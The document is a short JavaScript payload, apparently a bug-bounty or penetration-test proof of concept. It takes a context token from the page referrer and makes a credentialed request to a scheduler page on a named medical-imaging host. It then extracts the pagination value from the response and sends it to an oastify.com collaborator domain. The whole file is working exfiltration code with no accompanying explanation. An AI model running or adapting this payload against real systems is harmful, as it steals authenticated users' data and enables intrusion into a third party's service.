(function(){
let ref=document.referrer;
let c=ref.match(/cContext=([^&]+)/);
if(c){
let ctx=c[1];
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage=1&cContext='+ctx,{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let m=t.match(/<A[^>]+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
if(m) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?lastpage='+m[1],{mode:'no-cors'});
});
}
})();

